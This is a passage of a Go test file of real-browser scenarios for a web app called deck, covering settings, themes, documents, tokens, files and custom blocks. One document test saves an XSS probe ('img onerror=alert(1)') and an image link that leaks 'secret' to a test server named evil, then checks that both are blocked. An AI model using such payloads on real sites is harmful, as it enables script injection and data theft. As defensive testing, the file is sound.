package scenarios

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"image"
	"image/png"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"slices"
	"strings"
	"testing"
	"time"

	"deck2/internal/app"
	deckhome "deck2/internal/home"
	"deck2/internal/sandbox"

	"deck2/internal/provider"
)

// themeProbe is the HTML of a custom block that reports the theme of its host, first and after each change.
const themeProbe = `<!doctype html><html><body><p>theme</p><script type="module">
import { App } from "/ext-apps.js";
const app = new App({ name: "theme", version: "1" });
const report = () => { const c = app.getHostContext() ?? {}; const v = c.styles?.variables ?? {};
  return app.callServerTool({ name: "web.mark", arguments: { text: JSON.stringify({ theme: c.theme ?? "",
    bg: v["--color-background-primary"] ?? "", ring: v["--color-ring-primary"] ?? "", radius: v["--border-radius-md"] ?? "" }) } }); };
app.onhostcontextchanged = () => void report();
await app.connect();
await report();
</script></body></html>`

type hostTheme struct{ Theme, Bg, Ring, Radius string }

// themesSeen are the themes the custom block reported, in order.
func (e *Env) themesSeen() []hostTheme {
	e.T.Helper()
	var out []hostTheme
	ps := e.processes()
	slices.Reverse(ps)
	for _, x := range ps {
		if x.Command != "mark" {
			continue
		}
		var res struct{ Seen string }
		_ = json.Unmarshal(e.waitState(x.ID, "done").Result, &res)
		var th hostTheme
		_ = json.Unmarshal([]byte(res.Seen), &th)
		out = append(out, th)
	}
	return out
}

// TestRealBrowserSettings drives the Settings screen of deck in the real browser of Playwright MCP:
// DECK_REAL_BROWSER=1 go test ./tests/scenarios -run TestRealBrowser -v.
func TestRealBrowserSettings(t *testing.T) {
	if os.Getenv("DECK_REAL_BROWSER") == "" {
		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
	}
	checkBuiltClient(t)
	f := newACP(t)
	if err := os.WriteFile(filepath.Join(f.dir, "versionfails"), nil, 0o644); err != nil {
		t.Fatal(err)
	}
	e := newEnv(t, webNotesAgent(), func(c *app.Config) {
		c.ACPBinaries = map[string]string{"goose": filepath.Join(f.dir, "goose")}
		c.Sandbox = fakeDirSandbox{sandbox.New(), f.dir, nil}
	})
	e.App.Providers.Checks(t.Context(), time.Now())
	e.waitHealth("agent:goose", "error")
	e.createProject("web", webNotesMark)
	e.must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": themeProbe}, nil)

	b := newPlaywright(t)
	b.call("browser_resize", map[string]any{"width": 1280, "height": 900})
	b.open(e.URL + "/?token=" + token + "#/deck/settings")
	b.until("the appearance tab", `document.querySelector('[data-appearance]')`)
	root := func(v string) string {
		return `getComputedStyle(document.documentElement).getPropertyValue('` + v + `').trim()`
	}
	if got := b.eval(`document.documentElement.dataset.mantineColorScheme + ' ' + !!document.querySelector('[data-look="scheme"][data-value="auto"]')`); got != "light true" {
		t.Fatalf("the scheme follows the system, light in the headless browser: %s", got)
	}
	b.look("scheme", "dark")
	b.until("the dark scheme", `document.documentElement.dataset.mantineColorScheme === 'dark'`)
	b.eval(`(document.querySelector('[data-accent="grape"]').click(), '')`)
	b.until("the accent", root("--mantine-primary-color-filled")+` === `+root("--mantine-color-grape-filled"))
	b.look("density", "compact")
	b.until("the compact spacing", root("--mantine-spacing-md")+`.includes('0.75')`)
	b.look("font", "large")
	b.until("the large text", root("--mantine-font-size-md")+`.includes('1.15')`)
	if got := b.eval(`String(!document.querySelector('[data-look="radius"]'))`); got != "true" {
		t.Fatal("the corners are the theme's, not a setting of the device")
	}
	b.shot("settings-interface")

	b.open(e.URL + "/#/deck/settings")
	b.until("the look kept on the device", `document.documentElement.dataset.mantineColorScheme === 'dark' && `+
		root("--mantine-primary-color-filled")+` === `+root("--mantine-color-grape-filled")+` && `+root("--mantine-spacing-md")+`.includes('0.75')`)

	b.open(e.URL + "/#/p/web/main")
	b.until("the custom block", `document.querySelector('[data-custom]')`)
	dark := hostTheme{Theme: "dark", Bg: b.eval(root("--mantine-color-body")), Ring: b.eval(root("--mantine-color-grape-filled")),
		Radius: b.eval(root("--mantine-radius-md"))}
	e.waitFor("the custom block to report its theme", func() bool { return len(e.themesSeen()) > 0 })
	if got := e.themesSeen()[0]; got != dark || got.Bg == "" || got.Radius == "" {
		t.Fatalf("a custom block gets the scheme and the resolved variables of the host: %+v, want %+v", got, dark)
	}

	b.call("browser_tabs", map[string]any{"action": "new"})
	b.open(e.URL + "/#/deck/settings")
	b.until("the appearance tab in the second tab", `document.querySelector('[data-appearance]')`)
	b.look("scheme", "light")
	b.until("the light scheme", `document.documentElement.dataset.mantineColorScheme === 'light'`)
	light := b.eval(root("--mantine-color-body"))
	b.call("browser_tabs", map[string]any{"action": "select", "index": 0})
	e.waitFor("the custom block to hear of the light scheme in place", func() bool {
		ts := e.themesSeen()
		return len(ts) > 1 && ts[len(ts)-1].Theme == "light"
	})
	if ts := e.themesSeen(); ts[len(ts)-1].Bg != light || ts[len(ts)-1].Bg == dark.Bg {
		t.Fatalf("the new scheme brings its colors to the frame: %+v, want %s", ts, light)
	}

	_, tok := e.token("terminal", "deck.*")
	if code, out := e.callWith(tok, "deck.project_create", map[string]any{"name": "notes", "manifest": draftManifest}); code != 200 {
		t.Fatalf("project_create: %d %s", code, out)
	}
	tab := func(name string) {
		find := `[...document.querySelectorAll('[role=tab]')].find((x) => x.innerText.trim() === '` + name + `')`
		b.until("the tab "+name, find)
		b.eval(`(` + find + `.click(), '')`)
	}
	b.open(e.URL + "/#/deck/settings")
	b.until("the projects tab", itemOf("notes", "enabling grants"))
	b.reviewAndEnable("notes")
	e.waitFor("the enabled draft", func() bool { return e.project("notes").Status == "enabled" })
	b.shot("settings-draft")
	b.open(e.URL + "/#/deck/settings")
	b.until("the enabled draft", itemOf("notes", "enabled"))
	if p := e.project("notes"); p.Status != "enabled" {
		t.Fatalf("enable on the projects tab turns the draft on: %+v", p)
	}
	b.shot("settings-projects")

	tab("Health")
	b.until("the failing checks alone on Health", `[...document.querySelectorAll('[data-block]')].some((x) => x.innerText.includes('Failing checks')) && ![...document.querySelectorAll('[data-block]')].some((x) => x.offsetParent && x.innerText.includes('Everything deck checks'))`)
	b.shot("settings-health")
	tab("Advanced")
	agent := `[...document.querySelectorAll('tr')].find((r) => [...r.querySelectorAll('td')].some((d) => d.innerText.trim() === 'goose'))`
	b.until("the agents with why one gives no version", agent)
	if got := b.eval(`String(!` + agent + `.innerText.includes('exit status 1') && !!` + agent + `.querySelector('[data-format="tag"][data-hint]'))`); got != "true" {
		t.Fatal("the line of an agent is its status with the error as its hint, the whole error in the row opened under it")
	}
	b.eval(`(` + agent + `.querySelector('[data-row-toggle]').click(), '')`)
	b.until("the whole error on demand", agent+`.nextElementSibling?.matches('[data-row-more]') && `+agent+`.nextElementSibling.innerText.includes('exit status 1')`)
	b.shot("settings-advanced")

	b.until("the add secret button", `document.querySelector('[data-dialog-open="secret"]')`)
	b.eval(`(document.querySelector('[data-dialog-open="secret"]').click(), '')`)
	secret := `document.querySelector('[data-form="deck.secret_set"] input[data-field="value"]')`
	b.until("the secret form", secret)
	if got := b.eval(secret + `.type`); got != "password" {
		t.Fatalf("the value of a secret is typed into a hidden field: %s", got)
	}
	b.type_(`document.querySelector('[data-form="deck.secret_set"] input[data-field="name"]')`, "mail-key")
	b.type_(secret, "s3cret-value")
	b.eval(`(document.querySelector('[data-form="deck.secret_set"] [data-submit]').click(), '')`)
	b.until("the secret in the list and the dialog closed", `[...document.querySelectorAll('tr')].some((x) => x.innerText.includes('mail-key')) && !`+secret)
	if got := b.eval(`String(document.body.innerText.includes('s3cret-value'))`); got != "false" {
		t.Fatal("the value of a secret is not on the page after it is set")
	}

	b.until("the create token button beside the secrets", `document.querySelector('[data-dialog-open="token"]')`)
	b.eval(`(document.querySelector('[data-dialog-open="token"]').click(), '')`)
	b.until("the token form", `document.querySelector('[data-form="deck.token_create"]')`)
	b.type_(`document.querySelector('[data-form="deck.token_create"] input[data-field="name"]')`, "shortcuts")
	b.eval(`(() => { const i = document.querySelector('[data-form="deck.token_create"] input[data-field="commands"]'); i.focus();
		Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value').set.call(i, 'deck.notify');
		i.dispatchEvent(new Event('input', { bubbles: true })); i.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true })); return '' })()`)
	b.eval(`(document.querySelector('[data-form="deck.token_create"] [data-submit]').click(), '')`)
	b.until("the new token shown once under its form", `document.querySelector('[data-form="deck.token_create"] [data-outcome="done"]')?.innerText.includes('claude mcp add')`)
	if got := b.eval(`[...document.querySelectorAll('[data-form="deck.token_create"] [data-field]')].map((x) => x.dataset.field).join(' ')`); got != "name commands" {
		t.Fatalf("a form asks in the order of the command's params: %s", got)
	}
	b.eval(`(document.querySelector('[data-dialog="token"] .mantine-Modal-close').click(), '')`)
	b.until("the token in the list", `[...document.querySelectorAll('tr')].some((r) => r.innerText.includes('shortcuts') && r.innerText.toLowerCase().includes('live'))`)
	b.eval(`([...document.querySelectorAll('tr')].find((r) => r.innerText.includes('shortcuts')).querySelector('[data-verb="revoke"]').click(), '')`)
	b.until("the owner asked before the revoke", `document.querySelector('[data-confirm]')`)
	var toks []struct {
		Name    string
		Revoked bool
	}
	e.must("deck.tokens_list", nil, &toks)
	for _, x := range toks {
		if x.Name == "shortcuts" && x.Revoked {
			t.Fatal("the token is not revoked before the owner says yes")
		}
	}
	b.eval(`(document.querySelector('[data-confirm-yes]').click(), '')`)
	b.until("the revoked token", `[...document.querySelectorAll('tr')].some((r) => r.innerText.includes('shortcuts') && r.innerText.toLowerCase().includes('revoked'))`)
	b.shot("settings-tokens")
	for _, name := range []string{"Models", "Commands", "Connections"} {
		tab(name)
		b.until("the tab "+name+" drawn", `document.querySelector('[role=tabpanel]:not([hidden]) [data-block]')`)
		b.shot("settings-" + strings.ToLower(name))
	}
	for name, at := range map[string]string{"schedule-failed": "schedule?tab=Failed", "spend": "spend", "files": "files"} {
		b.open(e.URL + "/#/deck/" + at)
		b.until("the screen "+at, `document.querySelector('[data-block]')`)
		b.shot(name)
	}

	b.open(e.URL + "/#/p/web/settings")
	row := `[...document.querySelectorAll('tr')].find((r) => r.innerText.includes('Score') && r.querySelector('input[data-pick="model"]'))`
	b.until("the commands of the project with their model", row)
	b.call("browser_run_code_unsafe", map[string]any{"code": `async (page) => { await page.locator('tr', {hasText: 'Score'}).locator('input[data-pick="model"]').click();
		await page.locator('[role=option][value="quiet"]:visible').click(); }`})
	assigned := func() string {
		var m struct {
			Assignments []struct {
				Project, Command, Role string
				Models                 []string
			}
		}
		e.must("deck.models_list", nil, &m)
		for _, a := range m.Assignments {
			if a.Project == "web" && a.Command == "score" && a.Role == "agent" {
				return strings.Join(a.Models, ",")
			}
		}
		return ""
	}
	e.waitFor("the model picked in the row of the command", func() bool { return strings.HasPrefix(assigned(), "quiet,") })

	b.call("browser_resize", map[string]any{"width": 390, "height": 844})
	b.open(e.URL + "/#/deck/settings")
	tab("Modules")
	b.until("the projects tab on a phone", `[...document.querySelectorAll('[data-item]')].some((x) => x.offsetParent && x.innerText.includes('enabled'))`)
	if got := b.eval(`String(document.documentElement.scrollWidth <= innerWidth + 1)`); got != "true" {
		t.Fatalf("the projects tab fits the width of a phone: %s", got)
	}
	b.shot("settings-projects-phone")
	tab("Interface")
	b.until("the appearance tab on a phone", `document.querySelector('[data-appearance]')`)
	if got := b.eval(`String(document.documentElement.scrollWidth <= innerWidth + 1)`); got != "true" {
		t.Fatalf("settings fit the width of a phone: %s", got)
	}
	b.shot("settings-phone")

	tab("Modules")
	if got := b.eval(`String(document.querySelector('nav').textContent.toLowerCase().includes('notes'))`); got != "true" {
		t.Fatalf("the project is in the menu before the delete: %s", got)
	}
	b.eval(pressIn(itemOf("notes", "enabled"), "delete"))
	b.until("the owner asked before the delete", `document.querySelector('[data-confirm]')?.innerText.includes('notes')`)
	var still []projectV
	e.projectsOf(&still)
	if len(still) != 2 {
		t.Fatalf("nothing is deleted before the owner says yes: %+v", still)
	}
	b.eval(`(document.querySelector('[data-confirm-yes]').click(), '')`)
	b.until("the deleted project gone from the tab and the menu", `![...document.querySelectorAll('[data-item]')].some((x) => x.innerText.includes('notes ·')) && !document.querySelector('nav').innerText.toLowerCase().includes('notes')`)
	still = nil
	e.projectsOf(&still)
	if len(still) != 1 || still[0].Name != "web" {
		t.Fatalf("the project is deleted after the yes: %+v", still)
	}
}

// TestRealBrowserDocuments reads, edits and reverts a document of a project on its page, and keeps the text of a
// list as text: DECK_REAL_BROWSER=1 go test ./tests/scenarios -run TestRealBrowser -v.
func TestRealBrowserDocuments(t *testing.T) {
	if os.Getenv("DECK_REAL_BROWSER") == "" {
		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
	}
	checkBuiltClient(t)
	evil := newService(t, func(w http.ResponseWriter, r *http.Request, n int) { w.Write([]byte("GIF89a")) })
	e := newEnv(t, nil)
	e.createProject("web", docsManifest)
	var d struct{ ID int64 }
	e.must("deck.document_save", map[string]any{"project": "web", "name": "notes/criteria.md", "kind": "doc",
		"text": "# Criteria\n\n- **short** <img src=x onerror=alert(1)>\n\n![seen](" + evil.URL + "/pixel?d=secret)"}, &d)
	for _, text := range []string{"<p>one</p>", "<p>two</p>"} {
		e.must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": text}, nil)
	}
	e.must("deck.records_upsert", map[string]any{"project": "web", "collection": "notes", "records": jsonl(map[string]any{"title": "alpha", "note": "a **bold** note"})}, nil)

	b := newPlaywright(t)
	b.call("browser_resize", map[string]any{"width": 1280, "height": 900})
	b.open(e.URL + "/?token=" + token + "#/p/web/main")
	b.until("the text of a list as it is", `[...document.querySelectorAll('[data-item]')].some((x) => x.innerText.includes('a **bold** note'))`)
	b.until("the named document on the main screen", `document.querySelector('[data-document="notes/criteria.md"] [data-markdown] h1')?.innerText === 'Criteria'`)
	if got := b.eval(`String(!!document.querySelector('[data-markdown] img[onerror]'))`); got != "false" {
		t.Fatal("markdown is sanitized: no handlers in the page")
	}
	b.until("the picture of the markdown in the page", `document.querySelector('[data-markdown] img[alt="seen"]')`)
	time.Sleep(time.Second)
	if n := len(evil.requests()); n != 0 {
		t.Fatalf("a picture in markdown is not fetched from the network: %d requests", n)
	}

	b.eval(`(document.querySelector('[data-group="web"] [data-extra="documents"]').click(), '')`)
	b.until("the documents screen as tiles", `[...document.querySelectorAll('[data-place]')].some((x) => x.offsetParent && x.innerText.includes('criteria.md'))`)
	b.eval(`([...document.querySelectorAll('[data-place]')].find((x) => x.offsetParent && x.innerText.includes('criteria.md')).click(), '')`)
	b.until("the document page", `location.hash === '#/p/web/document/`+fmt.Sprint(d.ID)+`' && document.querySelector('[data-edit]')`)
	b.eval(`(document.querySelector('[data-edit]').click(), '')`)
	b.type_(`document.querySelector('[data-draft]')`, "# Criteria\n\n- *brief*")
	b.type_(`document.querySelector('[data-reason]')`, "shorter")
	b.eval(`(document.querySelector('[data-save-document]').click(), '')`)
	b.until("the saved revision drawn", `document.querySelector('[data-markdown] em')?.innerText === 'brief' && !document.querySelector('[data-draft]')`)
	var got struct {
		Text     string
		Revision int64
	}
	e.must("deck.document_get", map[string]any{"document": d.ID}, &got)
	if got.Text != "# Criteria\n\n- *brief*" || got.Revision != 2 {
		t.Fatalf("the edit is a new revision: %+v", got)
	}
	b.eval(`(document.querySelector('[data-history]').click(), '')`)
	b.until("the revisions", `document.querySelector('[data-revert="1"]')`)
	b.shot("document-page")
	b.eval(`(document.querySelector('[data-revert="1"]').click(), '')`)
	b.until("the first text back", `document.querySelector('[data-markdown] strong')?.innerText === 'short'`)
	e.must("deck.document_get", map[string]any{"document": d.ID}, &got)
	if got.Revision != 3 {
		t.Fatalf("going back is a new revision: %+v", got)
	}

	var ds []struct {
		ID   int64
		Name string
	}
	e.must("deck.documents_list", map[string]any{"project": "web"}, &ds)
	for _, x := range ds {
		if x.Name == "manifest.json" {
			b.open(e.URL + "/#/p/web/document/" + fmt.Sprint(x.ID))
		}
	}
	b.until("the manifest as source", `document.querySelector('[data-document="manifest.json"] [data-source]')?.innerText.includes('"collections"')`)
	if got := b.eval(`String(!!document.querySelector('[data-edit]'))`); got != "false" {
		t.Fatal("the manifest is read only on screen")
	}
	for _, x := range ds {
		if x.Name == "custom/chart.html" {
			b.open(e.URL + "/#/p/web/document/" + fmt.Sprint(x.ID))
		}
	}
	b.until("the history of the custom block", `document.querySelector('[data-document="custom/chart.html"] [data-history]')`)
	b.eval(`(document.querySelector('[data-history]').click(), '')`)
	b.until("its revisions", `document.querySelector('[data-revision="1"]')`)
	if got := b.eval(`String(!!document.querySelector('[data-revert]') || !!document.querySelector('[data-edit]'))`); got != "false" {
		t.Fatal("a read-only document has no edit and no going back on screen")
	}
	b.call("browser_resize", map[string]any{"width": 390, "height": 844})
	b.open(e.URL + "/#/p/web/document/" + fmt.Sprint(d.ID))
	b.until("the page on a phone", `document.querySelector('[data-document] [data-markdown] h1')`)
	if got := b.eval(`String(document.documentElement.scrollWidth <= innerWidth + 1)`); got != "true" {
		t.Fatalf("a document page fits the width of a phone: %s", got)
	}
	b.shot("document-phone")
}

// TestRealBrowserJournal takes a snapshot from the tabs of the schedule, downloads a file and shows its tabs on a phone:
// DECK_REAL_BROWSER=1 go test ./tests/scenarios -run TestRealBrowser -v.
func TestRealBrowserJournal(t *testing.T) {
	if os.Getenv("DECK_REAL_BROWSER") == "" {
		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
	}
	checkBuiltClient(t)
	e := newEnv(t, nil)
	pid := e.createProject("web", webNotesMark)
	if err := os.MkdirAll(filepath.Join(e.App.Home.Data(pid), "sub"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(e.App.Home.Data(pid), "sub", "a.txt"), []byte("a"), 0o600); err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"notes ü.txt", "100%.txt", `100% a;b".txt`} {
		e.upload("web", name, "text/html", "body of "+name)
	}
	b := newPlaywright(t)
	b.call("browser_resize", map[string]any{"width": 390, "height": 844})
	b.open(e.URL + "/?token=" + token + "#/deck/schedule")
	b.until("the schedule tabs", `[...document.querySelectorAll('[role=tab]')].map((x) => x.innerText.trim()).join(' ') === 'Schedule Failed Runs'`)
	b.open(e.URL + "/?token=" + token + "#/deck/files")
	b.until("the tabs of files", `[...document.querySelectorAll('[role=tab]')].map((x) => x.innerText.trim()).join(' ') === 'Files Data folders Documents Snapshots'`)
	b.eval(`([...document.querySelectorAll('[role=tab]')].find((x) => x.innerText.trim() === 'Data folders').click(), '')`)
	const visible = `[...document.querySelectorAll('[data-place]')].filter((x) => x.offsetParent)`
	b.until("the data folders of the projects as folder tiles", visible+`.some((x) => x.dataset.place === 'folder' && x.innerText.toLowerCase().includes('web'))`)
	if got := b.eval(`String([...document.querySelectorAll('button')].some((x) => x.offsetParent && x.innerText.trim() === 'Open'))`); got != "false" {
		t.Fatalf("a folder opens by its tile, without an Open button: %s", got)
	}
	b.eval(`(` + visible + `.find((x) => x.innerText.toLowerCase().includes('web')).click(), '')`)
	b.until("the data folder of web with its folder", `location.hash.includes('/deck/data') && `+visible+`.some((x) => x.dataset.place === 'folder' && x.innerText.trim() === 'sub')`)
	b.eval(`(` + visible + `.find((x) => x.innerText.trim() === 'sub').click(), '')`)
	b.until("the folder with the way up and its file", visible+`.some((x) => x.dataset.place === 'arrow-up') && [...document.querySelectorAll('[data-tile]')].some((x) => x.offsetParent && x.innerText.includes('a.txt'))`)
	b.shot("data-folder-phone")
	b.open(e.URL + "/?token=" + token + "#/deck/files")
	b.eval(`([...document.querySelectorAll('[role=tab]')].find((x) => x.innerText.trim() === 'Snapshots').click(), '')`)
	b.until("the snapshot form", `document.querySelector('[data-form="deck.snapshot_create"] [data-submit]')?.offsetParent`)
	b.eval(`(document.querySelector('[data-form="deck.snapshot_create"] [data-submit]').click(), '')`)
	b.until("the new snapshot in the list", `[...document.querySelectorAll('tr')].some((r) => r.offsetParent && r.innerText.includes('deck-'))`)
	b.eval(`(window.saved = [], HTMLAnchorElement.prototype.click = function () { fetch(this.href).then((r) => r.blob()).then(async (b) => { window.saved.push(b.type + ' ' + this.download + '=' + await b.text()); }); }, '')`)
	b.eval(`([...document.querySelectorAll('[role=tab]')].find((x) => x.innerText.trim() === 'Files').click(), '')`)
	b.until("the switch of the view of files", `[...document.querySelectorAll('[data-files-mode] input')].some((x) => x.value === 'list')`)
	b.eval(`([...document.querySelectorAll('[data-files-mode] input')].find((x) => x.value === 'list').click(), '')`)
	b.until("the download buttons of the files", `[...document.querySelectorAll('[data-row] [data-download]')].filter((x) => x.offsetParent).length === 3`)
	b.eval(`([...document.querySelectorAll('[data-row] [data-download]')].filter((x) => x.offsetParent).forEach((x) => x.click()), '')`)
	b.until("the downloaded files under their names, never as a page", `window.saved.length === 3 && window.saved.sort().join('|') === `+
		`'application/octet-stream 100% a;b".txt=body of 100% a;b".txt|application/octet-stream 100%.txt=body of 100%.txt|application/octet-stream notes ü.txt=body of notes ü.txt'`)
	if got := b.eval(`String(document.documentElement.scrollWidth <= innerWidth + 1)`); got != "true" {
		t.Fatalf("the journal fits the width of a phone: %s", got)
	}
	b.shot("journal-phone")
}

// TestRealBrowserRework sends a finished agent back with a remark from its page:
// DECK_REAL_BROWSER=1 go test ./tests/scenarios -run TestRealBrowser -v.
func TestRealBrowserRework(t *testing.T) {
	if os.Getenv("DECK_REAL_BROWSER") == "" {
		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
	}
	checkBuiltClient(t)
	e := newEnv(t, ok)
	p := e.createProject("jobs", testManifest([]string{agentCommand("job", "")}, nil))
	job := e.run(p, "job")
	e.waitState(job, "done")
	b := newPlaywright(t)
	b.open(e.URL + "/?token=" + token + "#/deck/process/" + fmt.Sprint(job))
	b.until("the rework button", `document.querySelector('[data-verb="rework"]')`)
	b.eval(`(document.querySelector('[data-verb="rework"]').click(), '')`)
	b.until("the remark field", `document.querySelector('input[placeholder="What to change"]')`)
	b.type_(`document.querySelector('input[placeholder="What to change"]')`, "shorter, please")
	b.eval(`([...document.querySelectorAll('button')].find((x) => x.innerText === 'Send').click(), '')`)
	e.waitFor("the second turn with the remark", func() bool {
		cs := e.Fake.Calls()
		return len(cs) == 2 && strings.Contains(cs[1].Prompt, "shorter, please")
	})
	e.waitState(job, "done")
}

// TestRealBrowserScreenKeepsItsStateOnReturn: a screen read again when the owner comes back to it keeps the tab
// picked and what the owner typed in a form.
func TestRealBrowserScreenKeepsItsStateOnReturn(t *testing.T) {
	if os.Getenv("DECK_REAL_BROWSER") == "" {
		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
	}
	checkBuiltClient(t)
	e := newEnv(t, nil)
	e.createProject("web", strings.Replace(webNotes, `{"type": "form", "title": "Score a title", "command": "score"},`,
		`{"type": "tabs", "tabs": [{"title": "Board", "blocks": [{"type": "stat", "title": "Notes", "source": {"collection": "notes"}}]},
			{"title": "Score", "blocks": [{"type": "form", "title": "Score a title", "command": "score"}]}]},`, 1))
	b := newPlaywright(t)
	b.open(e.URL + "/?token=" + token + "#/p/web/main")
	b.until("the tabs", `[...document.querySelectorAll('[role="tab"]')].some(x => x.innerText === 'Score')`)
	b.eval(`[...document.querySelectorAll('[role="tab"]')].find(x => x.innerText === 'Score').click(), ''`)
	b.until("the form of the second tab", `document.querySelector('[data-field="title"]')?.offsetParent`)
	b.eval(`(() => { const i = document.querySelector('[data-field="title"]');
		Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value').set.call(i, 'half typed');
		i.dispatchEvent(new Event('input', { bubbles: true }));
		window.reads = 0; const f = window.fetch;
		window.fetch = (u, o) => { if (String(u).includes('deck.screen') && !String(o?.body ?? '').includes('topic')) window.reads++; return f(u, o) };
		return '' })()`)
	b.eval(`(document.dispatchEvent(new Event('visibilitychange')), '')`)
	b.until("a full read on return", `window.reads > 0`)
	time.Sleep(time.Second)
	if got := b.eval(`document.querySelector('[role="tab"][aria-selected="true"]')?.innerText ?? ''`); got != "Score" {
		t.Fatalf("the tab picked stays after the screen is read again: %q", got)
	}
	if got := b.eval(`document.querySelector('[data-field="title"]')?.value ?? ''`); got != "half typed" {
		t.Fatalf("what the owner typed stays after the screen is read again: %q", got)
	}
}

// TestRealBrowserLogReadsEasily: the log of a process shows JSON of tools laid out, a long line wrapped, and the
// agent's message as markdown, all within the width of a phone.
func TestRealBrowserLogReadsEasily(t *testing.T) {
	if os.Getenv("DECK_REAL_BROWSER") == "" {
		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
	}
	checkBuiltClient(t)
	long := `{"id":1327,"project":"btc-forecast","command":"collect","state":"done","result":"` + strings.Repeat("a-long-value-without-spaces-", 20) + `"}`
	e := newEnv(t, func(ctx context.Context, c *Call) provider.Result {
		c.Req.OnEvent(provider.Event{Kind: provider.EventTool, ID: "t1", Title: "mcp__deck__process_get", Text: `{"process":1327,"fields":["state","result"]}`})
		c.Req.OnEvent(provider.Event{Kind: provider.EventToolUpdate, ID: "t1", Status: "completed", Text: long})
		c.Req.OnEvent(provider.Event{Kind: provider.EventMessage, Text: "The run is **done**:\n\n- one\n- two"})
		return provider.Result{Text: "{}"}
	})
	p := e.createProject("jobs", testManifest([]string{agentCommand("job", "")}, nil))
	job := e.run(p, "job")
	e.waitState(job, "done")
	b := newPlaywright(t)
	b.call("browser_resize", map[string]any{"width": 390, "height": 844})
	b.open(e.URL + "/?token=" + token + "#/deck/process/" + fmt.Sprint(job))
	b.until("the input of the tool laid out as JSON", `document.querySelector('[data-line="tool"] [data-json]')?.innerText.includes('"process": 1327,\n')`)
	b.until("the answer of the tool laid out and wrapped", `(() => { const x = document.querySelector('[data-line="tool"] [data-tool-result]'); return x && x.innerText.includes('"state": "done"') && x.scrollWidth <= x.clientWidth + 1 })()`)
	b.until("the message of the agent in markdown", `document.querySelector('[data-line="message"] strong')?.innerText === 'done' && document.querySelector('[data-line="message"] li')?.innerText === 'one'`)
	if got := b.eval(`String(document.documentElement.scrollWidth <= innerWidth + 1)`); got != "true" {
		t.Fatalf("the log fits the width of a phone: %s", got)
	}
	b.shot("log-phone")
}

// TestRealBrowserBoardMovesACardToALane: a dropped card presses its move button with the value of the lane, a long
// lane scrolls within the screen; on a phone the same button picks the lane.
func TestRealBrowserBoardMovesACardToALane(t *testing.T) {
	if os.Getenv("DECK_REAL_BROWSER") == "" {
		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
	}
	checkBuiltClient(t)
	e := newEnv(t, ok)
	e.createProject("work", boardManifest)
	e.must("deck.records_upsert", map[string]any{"project": "work", "collection": "tasks", "records": `{"title": "a", "status": "doing"}` + "\n" + `{"title": "b", "status": "todo"}`}, nil)
	b := newPlaywright(t)
	b.call("browser_resize", map[string]any{"width": 1400, "height": 900})
	b.open(e.URL + "/?token=" + token + "#/p/work/board")
	b.until("three lanes with their cards", `document.querySelectorAll('[data-board] [data-lane]').length === 3 && document.querySelector('[data-lane="todo"] [data-card]')`)
	b.eval(`(() => { const dt = new DataTransfer(); const card = document.querySelector('[data-lane="todo"] [data-card]');
		card.dispatchEvent(new DragEvent('dragstart', {dataTransfer: dt, bubbles: true}));
		document.querySelector('[data-lane="done"]').dispatchEvent(new DragEvent('drop', {dataTransfer: dt, bubbles: true})); return '' })()`)
	b.until("the card in its new lane at once", `document.querySelector('[data-lane="done"] [data-card]')`)
	e.waitFor("the move pressed with the lane", func() bool {
		for _, c := range e.Fake.Calls() {
			if strings.Contains(c.Prompt, `"status":"done"`) {
				return true
			}
		}
		return false
	})
	many := ""
	for i := range 40 {
		many += fmt.Sprintf(`{"title": "t%d", "status": "todo"}`+"\n", i)
	}
	e.must("deck.records_upsert", map[string]any{"project": "work", "collection": "tasks", "records": many}, nil)
	b.until("a long lane no higher than the screen, with a scroll of its own", `(() => { const l = document.querySelector('[data-lane="todo"]');
		return l.querySelectorAll('[data-card]').length >= 40 && l.getBoundingClientRect().height <= innerHeight && l.scrollHeight > l.clientHeight })()`)
	b.shot("board")
	b.call("browser_resize", map[string]any{"width": 390, "height": 844})
	b.eval(`([...document.querySelectorAll('[data-lane="doing"] button')].find((x) => x.innerText.includes('Move')).click(), '')`)
	b.until("the lanes to pick on a phone", `document.querySelector('[data-options]')`)
}

// customWindows is a custom block that opens a window of deck, is refused a page outside deck, and goes full screen.
const customWindows = `<!doctype html><html><body><p id="out">waiting</p><script type="module">
import { App } from "/ext-apps.js";
const app = new App({ name: "windows", version: "1" });
await app.connect();
const outside = await app.openLink({ url: "https://example.com/?leak=1" });
window.addEventListener("message", () => {});
document.body.dataset.outside = String(outside.isError === true);
const full = await app.requestDisplayMode({ mode: "fullscreen" });
await app.openLink({ url: "#/p/web/main?dialog=note-help" });
await app.callServerTool({ name: "web.mark", arguments: { text: JSON.stringify({ outside: outside.isError === true, mode: full.mode }) } });
</script></body></html>`

// TestRealBrowserCustomBlockOpensWindowsOfDeck: a custom block opens a window of deck by the MCP Apps open-link, not a
// page outside it, and covers the screen when it asks for full screen.
func TestRealBrowserCustomBlockOpensWindowsOfDeck(t *testing.T) {
	if os.Getenv("DECK_REAL_BROWSER") == "" {
		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
	}
	checkBuiltClient(t)
	e := newEnv(t, webNotesAgent())
	m := strings.Replace(webNotesMark, `{"type": "form", "title": "Score a title", "command": "score"},`,
		`{"type": "form", "title": "Score a title", "command": "score"}, {"type": "dialog", "name": "note-help", "title": "Help", "blocks": [{"type": "stat", "title": "Notes", "source": {"collection": "notes"}}]},`, 1)
	e.createProject("web", m)
	e.must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": customWindows}, nil)
